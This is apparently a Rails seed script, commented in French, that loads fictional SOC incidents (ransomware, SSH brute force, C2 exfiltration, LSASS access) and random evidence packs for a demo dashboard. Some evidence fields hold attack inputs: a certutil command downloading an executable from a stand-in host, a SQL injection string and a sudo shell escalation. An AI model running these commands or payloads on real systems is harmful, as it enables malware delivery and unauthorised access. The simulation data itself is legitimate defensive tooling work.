# © 2025 Lumensec - Données de Simulation SOC pour Nawal
puts "--- INITIALISATION DU SOC LUMENSEC ---"
AnalysisResult.destroy_all

incidents = [
  # SEVERITÉ 5 - CRITIQUE
  {
    tenant_id: "1",
    source: "Crowdstrike Falcon",
    status: "new",
    severity: 5,
    narrative: { summary: "Tentative d'exfiltration via Powershell encodé", details: "Le process powershell.exe a tenté de contacter une IP connue pour du C2 (91.234.56.78). Détection de 2.4GB de données en transfert." },
    triage: { verdict: "Malicious", priority: "Urgent", confidence: 0.98 },
    evidence: { processes: ["powershell.exe", "cmd.exe", "rundll32.exe"], hashes: ["a1b2c3d4e5f6g7h8i9j0", "b2c3d4e5f6g7h8i9j0k1"], ips: ["91.234.56.78"], domains: ["c2-server.com"] }
  },
  {
    tenant_id: "1",
    source: "Azure Sentinel",
    status: "triaging",
    severity: 5,
    narrative: { summary: "Ransomware LOCKBIT détecté - Chiffrement en cours", details: "Détection de 847 fichiers chiffrés en moins de 5 minutes. Pattern de comportement = LockBit 3.0. Le domaine admin-srv-01 est compromis." },
    triage: { verdict: "Ransomware", priority: "Critical", confidence: 0.99 },
    evidence: { processes: ["explorer.exe", "conhost.exe"], file_extensions: [".lockbit", ".encrypted"], registry_changes: 1247 }
  },
  
  # SEVERITÉ 4 - HAUTE
  {
    tenant_id: "1",
    source: "Wazuh",
    status: "new",
    severity: 4,
    narrative: { summary: "Brute Force SSH détecté - 2000+ tentatives en 10 minutes", details: "Source: 203.45.67.89 (Chine). Système d'authentification saturé. Risque élevé de compromission du serveur web-srv-03." },
    triage: { verdict: "Suspicious", priority: "High", confidence: 0.92 },
    evidence: { processes: ["sshd"], source_ips: ["203.45.67.89"], failed_attempts: 2000, successful_logins: 0 }
  },
  {
    tenant_id: "1",
    source: "Splunk",
    status: "triaging",
    severity: 4,
    narrative: { summary: "SQL Injection détectée sur la page login", details: "Pattern SQL classique détecté (UNION SELECT). User-Agent suspiect : Sqlmap/1.4.9. IP: 188.34.23.45" },
    triage: { verdict: "Attack", priority: "High", confidence: 0.87 },
    evidence: { attack_type: "SQL Injection", endpoint: "/api/users/login", attempts: 47, payload: "' OR '1'='1" }
  },
  {
    tenant_id: "1",
    source: "Cloudflare WAF",
    status: "new",
    severity: 4,
    narrative: { summary: "DDoS volumétrique détecté - 500 Gbps", details: "Attaque multi-source depuis botnets. Cibles: API endpoints. Mitigation automatique appliquée." },
    triage: { verdict: "DDoS Attack", priority: "High", confidence: 0.96 },
    evidence: { attack_type: "UDP Flood", peak_bandwidth: "500 Gbps", sources: 15000, country_codes: ["RU", "CN", "KP"] }
  },
  
  # SEVERITÉ 3 - MOYEN
  {
    tenant_id: "1",
    source: "Datadog",
    status: "triaging",
    severity: 3,
    narrative: { summary: "Suspicious Process Creation - certutil.exe", details: "Création de processus enfant depuis svchost.exe. Tentative de téléchargement d'un fichier binaire. Potentiellement un dropper malware." },
    triage: { verdict: "Suspicious", priority: "Medium", confidence: 0.78 },
    evidence: { processes: ["svchost.exe", "certutil.exe"], downloaded_files: ["update.bin"], command_line: "certutil.exe -urlcache -split -f http://malware.site/file.exe" }
  },
  {
    tenant_id: "1",
    source: "CrowdStrike Falcon",
    status: "resolved",
    severity: 3,
    narrative: { summary: "Suspicious Registry Modification - Autoruns", details: "Modification détectée dans HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run. Tentative de persistance." },
    triage: { verdict: "Suspicious", priority: "Medium", confidence: 0.82 },
    evidence: { registry_path: "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", modified_value: "svcupd.exe", detection_time: "2025-02-04 14:32:00" }
  },
  {
    tenant_id: "1",
    source: "osquery",
    status: "new",
    severity: 3,
    narrative: { summary: "Uncommanded Network Connection établie", details: "Process explorer.exe établit une connexion vers 45.142.185.247:4444. Port non standard. Risque de reverse shell." },
    triage: { verdict: "Suspicious", priority: "Medium", confidence: 0.75 },
    evidence: { process: "explorer.exe", remote_ip: "45.142.185.247", remote_port: 4444, protocol: "TCP", direction: "outbound" }
  },
  {
    tenant_id: "1",
    source: "Elastic Stack",
    status: "triaging",
    severity: 3,
    narrative: { summary: "Credential Dumping Attempt - LSASS Access", details: "Accès non autorisé à LSASS (Local Security Authority Subsystem Service). Technique MITRE ATT&CK T1003." },
    triage: { verdict: "Suspicious", priority: "Medium", confidence: 0.88 },
    evidence: { target_process: "lsass.exe", source_process: "powershell.exe", technique_id: "T1003", user: "DOMAIN\\admin" }
  },
  
  # SEVERITÉ 2 - BAS
  {
    tenant_id: "1",
    source: "Custom Firewall",
    status: "resolved",
    severity: 2,
    narrative: { summary: "Scan de ports Nmap détecté", details: "Scan complet Nmap sur les ports 1-65535 depuis 192.168.100.50." },
    triage: { verdict: "Reconnaissance", priority: "Low", confidence: 0.70 },
    evidence: { processes: ["nmap"], source_ip: "192.168.100.50", ports_scanned: "1-65535", duration: "23 minutes" }
  },
  {
    tenant_id: "1",
    source: "Zeek",
    status: "resolved",
    severity: 2,
    narrative: { summary: "Suspicious DNS Query - DGA Pattern", details: "Pattern de Domain Generation Algorithm détecté. 150+ requêtes DNS vers des domaines non-existants en 5 minutes." },
    triage: { verdict: "Suspicious", priority: "Low", confidence: 0.72 },
    evidence: { dns_queries: 150, pattern: "DGA", tld_variance: "high", source: "internal-workstation-7" }
  },
  {
    tenant_id: "1",
    source: "Suricata IDS",
    status: "new",
    severity: 2,
    narrative: { summary: "Détection de trafic Tor sortant", details: "Trafic HTTPS vers Tor Exit Node. Policy violation: Navigation interdite vers Tor." },
    triage: { verdict: "Policy Violation", priority: "Low", confidence: 0.85 },
    evidence: { destination_ip: "109.70.45.20", protocol: "HTTPS", service: "Tor Exit Node", user: "john.doe" }
  },
  {
    tenant_id: "1",
    source: "Network Monitoring",
    status: "resolved",
    severity: 2,
    narrative: { summary: "Données sensibles détectées dans SMTP", details: "Tentative d'envoyer un fichier contenant des données sensibles (credit cards) via email." },
    triage: { verdict: "Data Leak", priority: "Low", confidence: 0.80 },
    evidence: { email_from: "employee@company.com", email_to: "external@gmail.com", file_type: "xlsx", data_type: "Payment Cards" }
  },
  
  # SEVERITÉ 1 - INFORMATIF
  {
    tenant_id: "1",
    source: "Auditd",
    status: "resolved",
    severity: 1,
    narrative: { summary: "Connexion SSH réussie depuis IP nouvelle", details: "Connexion SSH établie depuis 78.45.123.45 (Estonie). Premier accès depuis cette IP." },
    triage: { verdict: "Informational", priority: "Low", confidence: 0.50 },
    evidence: { service: "SSH", user: "admin", source_ip: "78.45.123.45", country: "Estonia", first_time_connection: true }
  },
  {
    tenant_id: "1",
    source: "Osquery",
    status: "resolved",
    severity: 1,
    narrative: { summary: "Patch Management - Windows Update installé", details: "KB5034441 installé avec succès. Security Update pour Windows 11." },
    triage: { verdict: "Informational", priority: "Low", confidence: 0.99 },
    evidence: { patch_id: "KB5034441", os: "Windows 11", status: "installed", severity: "security" }
  },
  {
    tenant_id: "1",
    source: "Asset Management",
    status: "resolved",
    severity: 1,
    narrative: { summary: "Nouveau device détecté sur le réseau", details: "Appareil macOS 13.2.1 (MacBook) connecté au réseau Wi-Fi corporate. MAC: a4:da:22:45:67:89" },
    triage: { verdict: "Informational", priority: "Low", confidence: 0.75 },
    evidence: { device_type: "MacBook", os: "macOS 13.2.1", mac_address: "a4:da:22:45:67:89", network: "Corporate-Secure" }
  },
  {
    tenant_id: "1",
    source: "Cloud Connector",
    status: "new",
    severity: 1,
    narrative: { summary: "AWS CloudTrail - User Login Success", details: "IAM User 'terraform' s'est connecté via AWS Management Console avec succès." },
    triage: { verdict: "Informational", priority: "Low", confidence: 0.95 },
    evidence: { service: "AWS", event_type: "ConsoleLogin", user: "terraform", source_ip: "203.0.113.42", mfa_used: true }
  },
  
  # INCIDENTS ADDITIONNELS POUR VARIÉTÉ
  {
    tenant_id: "1",
    source: "Splunk",
    status: "triaging",
    severity: 4,
    narrative: { summary: "Privilege Escalation via Sudo", details: "Tentative d'exécution de commandes root via sudo sans logs appropriés. Utilisateur: jenkins_user. Commande: /bin/bash" },
    triage: { verdict: "Attack", priority: "High", confidence: 0.89 },
    evidence: { sudo_user: "jenkins_user", target_command: "/bin/bash", timestamp: "2025-02-04 16:45:32", log_tampering_detected: true }
  },
  {
    tenant_id: "1",
    source: "Endpoint Detection & Response",
    status: "new",
    severity: 3,
    narrative: { summary: "Suspicious File Write - System32 Directory", details: "Un processus tiers a écrit 3 fichiers .sys dans le répertoire System32. Comportement type de rootkit." },
    triage: { verdict: "Suspicious", priority: "Medium", confidence: 0.84 },
    evidence: { directory: "C:\\Windows\\System32", file_count: 3, file_type: ".sys", source_process: "svchost.exe" }
  },
  {
    tenant_id: "1",
    source: "API Gateway",
    status: "resolved",
    severity: 2,
    narrative: { summary: "Rate Limiting Triggered - Login API", details: "Endpoint /api/auth/login a reçu 500+ requêtes/min depuis 10 adresses IP différentes." },
    triage: { verdict: "Suspicious", priority: "Low", confidence: 0.76 },
    evidence: { endpoint: "/api/auth/login", requests_per_min: 500, unique_ips: 10, action: "rate_limited" }
  }
]

incidents.each do |inc|
  result = AnalysisResult.create!(inc)
  
  # Création d'un pack de preuves pour les incidents critiques
  if result.severity >= 4
    EvidencePack.create!(
      analysis_result: result,
      data: {
        pack_label: "Digital Forensic Pack #{['Alpha', 'Bravo', 'Charlie', 'Delta', 'Echo'].sample}",
        confidence_score: rand(85..99) / 100.0,
        items: [
          { type: "IP", label: "Attacker/Source IP", value: "#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}.#{rand(1..255)}" },
          { type: "DOMAIN", label: "C2 Domain", value: "#{['evil', 'malware', 'c2', 'botnet'].sample}-#{rand(1000..9999)}.com" },
          { type: "FILE", label: "Malicious File", value: "/#{['tmp', 'var', 'home'].sample}/#{['exploit', 'payload', 'dropper'].sample}.#{['sh', 'exe', 'bat'].sample}" },
          { type: "MD5", label: "File Hash", value: SecureRandom.hex(16) },
          { type: "REGISTRY", label: "Persistence Mechanism", value: "HKLM\\Software\\Microsoft\\Windows\\Run\\#{['svcupd', 'update', 'system'].sample}" }
        ]
      }
    )
  end
end

puts "--- SEED TERMINÉ ---"
puts "✅ #{AnalysisResult.count} INCIDENTS CRÉÉS"
puts "✅ #{EvidencePack.count} EVIDENCE PACKS CRÉÉS"
puts "--- LUMENSEC SOC PRÊT POUR LA DÉMO! ---"